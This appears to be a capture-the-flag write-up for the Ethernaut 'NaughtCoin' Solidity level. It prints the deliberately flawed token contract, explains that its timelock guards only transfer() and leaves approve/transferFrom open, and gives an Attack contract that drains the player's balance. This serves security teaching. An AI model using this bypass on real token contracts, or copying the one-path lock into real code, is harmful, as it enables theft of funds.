<div align="center">

# NaughtCoin

</div>



**NaughtCoin (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**

- NaughtCoin mints the entire supply to `player` and intends to lock that account for 10 years by applying `lockTokens` to `transfer()`.  
- The token follows ERC20 but **only** the `transfer` function is protected by the modifier — other ERC20 paths (allowance / `transferFrom`) are unguarded.  
- **So:** `player` cannot call `transfer(...)` until `timeLock` passes, but `player` can still `approve(...)` an attacker and that attacker can call `transferFrom(player, ...)` immediately.

2. **Vulnerability Highlight (key part)**


```solidity
// protected transfer — only this path is locked for player
function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
    super.transfer(_to, _value);
}
```






## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface INaughtCoin {
    function player() external view returns (address);
}

interface Ierc20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract Attack {
    function pwn(Ierc20 coin) external {
        INaughtCoin naught = INaughtCoin(address(coin));
        address playerAddr = naught.player();
        uint256 bal = coin.balanceOf(playerAddr);
        coin.transferFrom(playerAddr, address(this), bal);
    }
}

```

---


